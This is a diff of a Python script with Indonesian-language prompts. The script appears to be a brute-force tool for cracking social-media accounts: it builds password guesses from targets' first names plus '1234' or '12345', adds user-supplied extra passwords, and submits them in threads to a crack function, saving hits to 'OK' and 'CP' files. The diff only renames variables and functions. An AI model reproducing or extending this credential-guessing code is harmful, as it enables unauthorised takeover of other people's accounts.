@@ -403,21 +403,21 @@ def setting():
 		
 #
 	print(f'{b}========================================{x}')
-	pwtambahan=input(f'{P}[?] Kata Sandi Tambahan Y/t :{x} ')
+	pwplus=input(f'{P}[?] Kata Sandi Tambahan Y/t :{x} ')
 	print(f'{b}========================================{x}')
-	if pwtambahan in ['y','Y']:
+	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		pwnye=input(f'{P}[!] Masukkan Sandi Tambahan :{x} ')
+		pwku=input(f'{P}[!] Masukkan Sandi Tambahan :{x} ')
 		print(f'{b}========================================{x}')
-		pwlu=pwnye.split(',')
-		for pwp in pwlu:
-			pwnya.append(pwp)
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
-	word()
+	passwrd()
 	
 #
-def word():
+def passwrd():
 	print(f'{P}[•]{x} Hasil {H}OK{x} Tersimpan Di{x} {P}:{x} {h}%s {x}'%(okc))
 	print(f'{P}[•]{x} Hasil {K}CP{x} Tersimpan Di{x} {P}:{x} {k}%s {x}'%(cpc))
 	print(f'{b}========================================{x}')
@@ -442,8 +442,8 @@ def word():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 			if 'ya' in pwpluss:
-				for pwpl in pwnya:
-					pwv.append(pwpl)
+				for xpwd in pwnya:
+					pwv.append(xpwd)
 			else:pass
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
